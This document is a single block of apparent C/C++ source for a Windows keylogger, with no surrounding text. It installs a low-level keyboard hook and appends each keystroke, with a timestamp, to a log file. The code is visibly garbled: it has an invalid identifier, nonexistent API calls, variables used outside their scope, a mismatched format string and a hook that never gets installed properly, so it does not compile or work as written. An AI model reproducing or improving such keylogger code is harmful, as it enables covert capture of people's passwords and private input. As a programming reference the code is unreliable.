```c
#include <windows.h>
#include <stdio.h>
#include <ctime>
#include <iostream>

using namespace std;

#define LOG_FILE "keystroke.log"
static const DWORD KEY-strokes[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F};

HHOOK WINAPI KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    static FILE *file = nullptr;
    static HHOOK hook = nullptr;
    static DWORD lastKey = 0;
    static DWORD lastTime = 0;

    if (!file || hook == nullptr) {
        // Initialize the file
        file = fopen(LOG_FILE, "a");
        if (!file) {
            cout << "Failed to open log file!" << endl;
            return 0;
        }
        // Set up the hook
        hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardCallback);
        if (!hook) {
            cout << "Failed to set keyboard hook!" << endl;
            return 0;
        }
    }

    if (wParam == WM_KEYDOWN) {
        DWORD keyState = GetKeyState(0);
        if (keyState & 0x1) {
            if (lastKey != wParam) {
                // Check if Shift, Ctrl, or Alt is pressed
                bool isModifier = (wParam == 0x1B) || (wParam == 0x5B) || (wParam == 0xA4);
                if (isModifier) {
                    for (int i = 0; i < sizeof(KEY-strokes)/sizeof(KEY-strokes[0]); i++) {
                        if (wParam == KEY-strokes[i]) {
                            // Handle modifier keys
                            break;
                        }
                    }
                }
                // Record the key and the timestamp
                time_t now = time(nullptr);
                fprintf(file, "[%s] %c %c\n", ctime(&now), static_cast<char>(wParam));
                lastKey = wParam;
                lastTime = now;
            }
        }
    } else if (wParam == WM_KEYUP) {
        if (lastKey == wParam) {
            // Key is released
            lastKey = 0;
        }
    }

    return hook != nullptr ? 1 : 0;
}

int main() {
    // Start the hook and run the loop
    MSG msg;
    while (GetMessage(&msg, 0)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            Sleep(100); // Avoid high CPU usage
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Remove the hook
    if (hook) {
        UnhookKeyboard(hook);
        fclose(file);
        cout << "Keyboard hook removed." << endl;
    } else {
        cout << "No hook installed!" << endl;
    }

    return 0;
}
```

